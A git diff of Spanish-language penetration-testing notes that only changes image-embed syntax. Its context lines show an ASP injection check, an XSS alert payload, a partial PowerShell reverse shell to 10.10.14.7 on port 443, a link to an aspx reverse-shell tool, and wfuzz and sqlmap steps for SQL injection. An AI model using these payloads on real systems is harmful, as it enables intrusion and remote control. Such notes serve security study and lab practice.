@@ -83,7 +83,7 @@ Si tenemos una web que nos interpreta ASP y es vulnerable a inyección de códig
 
 Si esto nos devuelve 49...
 
-![[Pasted image 20230723111348.png]]
+![Pasted image 20230723111348.png]
 
 Significa que es vulnerable. También podemos probar si es vulnerable a XSS:
 
@@ -91,7 +91,7 @@ Significa que es vulnerable. También podemos probar si es vulnerable a XSS:
 <script>alert("XSS")</script>
 ```
 
-![[Pasted image 20230723111545.png]]
+![Pasted image 20230723111545.png]
 
 Y sí. Pero nos interpreta código ASP, así que la idea es inyectar comandos:
 
@@ -188,7 +188,7 @@ $c = New-Object System.Net.Sockets.TCPClient('10.10.14.7',443);$stream = $c.GetS
 
 Con [esta](https://raw.githubusercontent.com/jivoi/pentest/master/shell/insomnia_shell.aspx) herramienta nos podemos mandar una reverse shell. Lo único que necesitamos es subir el aspx a la web:
 
-![[Pasted image 20230725144724.png]]
+![Pasted image 20230725144724.png]
 
 ## Adaptar /etc/krb5.conf
 
@@ -303,7 +303,7 @@ wfuzz -c -u http://url/of/api -w /usr/share/SecLists/Fuzzing/special-chars.txt -
 
 Esto nos reportará los caracteres prohibidos, pero a lo mejor solo está prohibido `'` , que en hexadecimal es `0x27`, así que a la web le podrías pasar `\u27` y si está mal implementado te debería dejar hacerlo.
 
-![[Pasted image 20230727105759.png]]
+![Pasted image 20230727105759.png]
 
 Hacer este tipo de SQLi manualmente es un dolor de cabeza ya que tienes que codificar muchas cosas, por lo que lo mejor que puedes hacer es guardar el request y pasárselo a `sqlmap`:
 
